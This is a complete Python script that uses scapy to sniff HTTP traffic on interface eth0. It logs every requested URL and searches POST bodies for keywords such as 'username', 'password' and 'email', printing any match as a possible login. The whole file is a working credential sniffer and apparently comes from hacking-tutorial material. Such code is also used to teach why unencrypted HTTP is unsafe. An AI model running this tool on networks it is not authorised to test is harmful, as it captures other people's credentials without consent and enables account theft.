#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw) and packet[http.HTTPRequest].Method.decode() == 'POST':
            load = packet[scapy.Raw].load.decode(errors='ignore')  # decode from bytes to string
            keywords = {"username", "user", "uname", "login", "password", "pass", "email", "e-mail", "mail"}
            for keyword in keywords:
                if keyword in load:
                    return load
                    
                    

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet).decode(errors='ignore')   # decode from bytes to string
        print(f"[+] HTTP Request >> {url}")
        login_info = get_login_info(packet)
        if login_info:
            print(f"\033[91m\n\n[+] Possible username/password > {login_info}\n\n\033[0m")

sniff("eth0")